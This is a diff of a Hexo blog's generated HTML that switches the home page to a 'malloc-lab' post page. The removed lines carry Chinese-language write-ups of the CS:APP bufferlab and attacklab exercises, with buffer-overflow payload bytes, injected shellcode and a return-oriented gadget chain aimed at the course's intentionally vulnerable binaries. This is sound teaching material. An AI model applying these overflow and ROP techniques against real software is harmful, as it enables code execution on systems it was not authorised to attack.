@@ -23,28 +23,40 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"xiaosolll.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
   </script>
-<meta property="og:type" content="website">
-<meta property="og:title" content="Antinomy">
-<meta property="og:url" content="https://xiaosolll.github.io/index.html">
+<meta name="description" content="malloc-lab空闲块组织  –结构 放置—链表首次适配，下一次适配、最佳适配–分离式空闲链表组织 分割 合并–立即合并、推迟合并 立即合并： 1234567891011121314151617181920212223242526static void *imme_coalesce(void *bp)&amp;#123;	size_t prev_alloc &#x3D; GET_ALLO(FTRP(PREV_B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="malloc-lab">
+<meta property="og:url" content="https://xiaosolll.github.io/2021/02/21/malloc-lab/index.html">
 <meta property="og:site_name" content="Antinomy">
+<meta property="og:description" content="malloc-lab空闲块组织  –结构 放置—链表首次适配，下一次适配、最佳适配–分离式空闲链表组织 分割 合并–立即合并、推迟合并 立即合并： 1234567891011121314151617181920212223242526static void *imme_coalesce(void *bp)&amp;#123;	size_t prev_alloc &#x3D; GET_ALLO(FTRP(PREV_B">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210220174745480.png">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210220175605144.png">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210220212323377.png">
+<meta property="og:image" content="file://C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20210220175605144.png?lastModify=1613877345">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210221112249902.png">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210221103040332.png">
+<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210221100825538.png">
+<meta property="article:published_time" content="2021-02-21T03:56:57.000Z">
+<meta property="article:modified_time" content="2021-02-21T03:59:57.074Z">
 <meta property="article:author" content="eetan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210220174745480.png">
 
 
-<link rel="canonical" href="https://xiaosolll.github.io/">
+<link rel="canonical" href="https://xiaosolll.github.io/2021/02/21/malloc-lab/">
 
 
 <script class="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
-<title>Antinomy</title>
+<title>malloc-lab | Antinomy</title>
   
 
 
@@ -130,7 +142,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -143,6 +155,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#malloc-lab"><span class="nav-number">1.</span> <span class="nav-text">malloc-lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloclab%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">malloclab代码分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">地址映射过程</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -184,16 +197,17 @@
 </noscript>
 
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/02/21/malloc-lab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -206,9 +220,9 @@
       <meta itemprop="name" content="Antinomy">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/21/malloc-lab/" class="post-title-link" itemprop="url">malloc-lab</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          malloc-lab
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -232,7 +246,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="malloc-lab"><a href="#malloc-lab" class="headerlink" title="malloc-lab"></a>malloc-lab</h2><p>空闲块组织  –结构</p>
+        <h2 id="malloc-lab"><a href="#malloc-lab" class="headerlink" title="malloc-lab"></a>malloc-lab</h2><p>空闲块组织  –结构</p>
 <p>放置—链表首次适配，下一次适配、最佳适配–分离式空闲链表组织</p>
 <p>分割</p>
 <p>合并–立即合并、推迟合并</p>
@@ -335,7 +349,6 @@
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kang___xi/article/details/79571137">https://blog.csdn.net/kang___xi/article/details/79571137</a></p>
 
-      
     </div>
 
     
@@ -343,322 +356,22 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/02/14/bufferlab/" rel="prev" title="bufferlab">
+                  <i class="fa fa-chevron-left"></i> bufferlab
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
     </footer>
   </article>
 </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/02/14/bufferlab/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/14/bufferlab/" class="post-title-link" itemprop="url">bufferlab</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-02-14 23:01:36" itemprop="dateCreated datePublished" datetime="2021-02-14T23:01:36+08:00">2021-02-14</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-02-16 20:41:41" itemprop="dateModified" datetime="2021-02-16T20:41:41+08:00">2021-02-16</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="bufferlab"><a href="#bufferlab" class="headerlink" title="bufferlab"></a>bufferlab</h2><blockquote>
-<p>You cangenerate your cookie with the makecookie program giving your userid as the argument. For example:<br>unix&gt; ./makecookie bovik<br>unix&gt; ./bufbomb -u bovik<br>./hex2raw &lt;level1.txt | ./bufbomb -u eetan</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214190516757.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214171421629.png" alt="在这里插入图片描述"><br>getbu接受不大于32字节的输入。</p>
-<h4 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h4><p><img src="https://img-blog.csdnimg.cn/20210214173214384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214173153654.png" alt="在这里插入图片描述"><br>三个printf输出的内容都不是我们想看见的<br><img src="https://img-blog.csdnimg.cn/20210214173351718.png" alt="在这里插入图片描述"></p>
-<p>实验希望getbuf返回至smoke函数。<br>getbuf中gets函数接收输入。<br><img src="https://img-blog.csdnimg.cn/20210214174146828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>lea取[ebp-0x28]的有效地址赋给eax，使得buffer的大小为0x28.<br><img src="https://img-blog.csdnimg.cn/20210214174329527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>payload=垃圾数据（0x28）+ebp+ret（smoke函数）</p>
-<p>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 18 8c 04 08</p>
-<blockquote>
-<p>测试：./hex2raw &lt;level0.txt | ./bufbomb -u eetan</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214174626127.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h4 id="level1："><a href="#level1：" class="headerlink" title="level1："></a>level1：</h4><p><img src="https://img-blog.csdnimg.cn/20210214174732175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要将自己id对应的cookie输入到val，达到目标。<br>40字节的缓冲区大小。<br><img src="https://img-blog.csdnimg.cn/20210214175113177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以得知cookie应该放在ebp+8的位置。<br>当然有参数的被调用函数，参数从右向左入栈。且被调函数从ebp+8，ebp+12这些地方获得参数。（ebp+4为ret）</p>
-<p>构造的payload应该为=40字节垃圾数据+4ebp+返回地址（fizz）+随意四字节数据+参数输入为cookie值.</p>
-<blockquote>
-<p>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 42 8c 04 08 11 11 11 11 6f 2c 21 5e</p>
-</blockquote>
-<blockquote>
-<p>./hex2raw &lt;level0.txt | ./bufbomb -u eetan 来测试结果</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214225726537.png" alt="在这里插入图片描述"></p>
-<h4 id="level2："><a href="#level2：" class="headerlink" title="level2："></a>level2：</h4><p>test函数–&gt;getbuf函数–&gt;bang函数，并且传入bang函数的参数为cookie的值。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210216194157743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>从+6和+11可以看出global_value等于0存储在0x804d100中。</p>
-<p>所以需要将global的值更改为cookie的值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e212c6f,%eax</span><br><span class="line">movl %eax,0x804d100 </span><br><span class="line">push $0x08048c9d </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210216203233328.png" alt="在这里插入图片描述"></p>
-<p><strong>不能在ret后加bang地址，栈已经回到了test的栈。<br>leave == mov esp,ebp  pop ebp<br>ret == pop eip</strong></p>
-<blockquote>
-<p>转化为十六进制步骤:<br>gcc -c level2.s -o level2.o<br>objdump -d level2.o    &gt; level2.txt</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210216203254963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>b8 6f 2c 21 5e 89 04 25 00 d1 04 08 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f8 3b 68 55</p>
-<blockquote>
-<p>./hex2raw &lt;level22.txt | ./bufbomb -u eetan</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210216203214990.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/02/14/attacklab/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/14/attacklab/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-02-14 16:39:04 / Modified: 23:06:15" itemprop="dateCreated datePublished" datetime="2021-02-14T16:39:04+08:00">2021-02-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>title: attacklab<br>date: 2021-02-14 16:38:42<br>tags:</p>
-<h2 id="attacklab"><a href="#attacklab" class="headerlink" title="attacklab"></a>attacklab</h2><p><img src="https://img-blog.csdnimg.cn/20210214114034289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>缓冲区大小 0x28</p>
-<p>返回地址转到touch1处</p>
-<p>输入0x28字节填满缓冲区，返回地址填入c0 17 40 00</p>
-<p>11 11 11 11（这里是四个字节）前面0x28随便填，最后是c0 17 40 00</p>
-<blockquote>
-<p>The program HEX2RAW will enable you to generate these raw strings. </p>
-<p> HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to<br>create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef<br>you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byteordering).</p>
-<p>unix&gt; ./hex2raw &lt; ctarget.l2.txt | ./ctarget</p>
-</blockquote>
-<p>touch2：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111115315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>函数的第一个参数在寄存器%rdi中传递，应该注入代码使得寄存器设置为cookie的值，然后ret到touch2的首条指令。</p>
-<p>我的cookie=0x59b997fa</p>
-<p>mov    $0x59b997fa,%rdi//设置寄存器以便判断中进入val==cookie的条件语句中。</p>
-<p>pushq  $0x4017ec //touch2的地址压栈以便ret</p>
-<p>ret</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111142380.png" alt="在这里插入图片描述"></p>
-<p>mov    $0x59b997fa,%rdi</p>
-<p>pushq  $0x4017ec</p>
-<p>ret<br><img src="https://img-blog.csdnimg.cn/2021021411120087.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111212873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>48 c7 c7 97 bf b9 59<br>68 ec 17 40 00<br>c3</p>
-<p>和level1一样是40个字节的缓冲区大小，代码的最后ret应该填写rsp，转而去执行我们的代码。在getbuf处下断点，run -q 查看rsp的值。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111246269.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111301844.png" alt="在这里插入图片描述"></p>
-<blockquote>
-<p>一开始打第一句getbuf的断点，出来的rsp是a0，总是通过不了，后面发现断点打错了。。是78.</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214112322830.png" alt="在这里插入图片描述"></p>
-<p>​                       </p>
-<p>48 c7 c7 fa 97 b9 59 68 ec 17  40 00 c3 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 00 00  78 dc 61 55 00 00 00 00      </p>
-<blockquote>
-<p>./hex2raw -i touch2.txt | ./ctarget -q    来验证。<br><img src="https://img-blog.csdnimg.cn/20210214112055849.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<p>touch3：</p>
-<p>0x59b997fa的ASCII：35 39 62 39 39 37 66 61 00</p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111329623.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214111344111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>传入touch3的参数是一个字符串的首地址，这个地址指向的字符串应该要与cookie的字符串表示相同。</p>
-<p>cookie存放的位置需要注意，调用的hexmacth里面的数组或许会把cookie覆盖。</p>
-<p>//这里一直进不去hexmatch。。不找里面不变的空间，看了别的博客发现可以开辟空间，造个栈。<br><img src="https://img-blog.csdnimg.cn/20210214113110479.png" alt="在这里插入图片描述"></p>
-<p>movq $0x5561dc93,%rdi<br>sub $0x28,%rsp<br>pushq $0x4018fa<br>retq</p>
-<p>48 c7 c7 93 dc 61 55 48<br>83 ec 28 68 fa 18 40 00<br>c3 00 00 00 00 00 00 00<br>00 00 00 35 39 62 39 39<br>37 66 61 00 00 00 00 00<br>78 dc 61 55</p>
-<blockquote>
-<p>./hex2raw -i touch3.txt | ./ctarget -q    来验证。</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214112512736.png" alt="在这里插入图片描述"><br>rtarget–touch2</p>
-<blockquote>
-<p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your<br>gadget farm. </p>
-</blockquote>
-<p>目标：依然是跳到touch2，然后完成匹配cookie。<br>ctarget的汇编：</p>
-<blockquote>
-<p>mov    $0x59b997fa,%rdi</p>
-<p>pushq  $0x4017ec</p>
-<p>ret</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214132736976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实验手册的机器码和汇编代码的对应。<br>看看有没有pop rdi–5f<br><img src="https://img-blog.csdnimg.cn/20210214140814536.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210214132940987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现没有，看看其他的pop有没有。发现只有58有三个。决定从rax和rdi之间的关系入手。<br><img src="https://img-blog.csdnimg.cn/20210214133509885.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133524382.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133540880.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133725906.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210214133733498.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021021413374237.png" alt="在这里插入图片描述"><br>mov rax,rdi也有三个。</p>
-<p>需要gadgets为<br>mov rax,rdi<br>pop rdi<br>ret<br>因此找到0x4019ab和0x4019c6(这几个中随便选的)<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00//40垃圾数据<br>ab 19 40 00 00 00 00 00//ret进pop rax  将cookie赋给rax<br>fa 97 b9 59 00 00 00 00<br>c6 19 40 00 00 00 00 00//后一个pop rax里的ret进入mov<br>ec 17 40 00 00 00 00 00//mov的ret最后返回touch2</p>
-<blockquote>
-<p>验证：           ./hex2raw -i level4.txt | ./rtarget -q </p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20210214135735612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzI5NjMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/02/14/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/14/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-02-14 15:45:55" itemprop="dateCreated datePublished" datetime="2021-02-14T15:45:55+08:00">2021-02-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
 
 
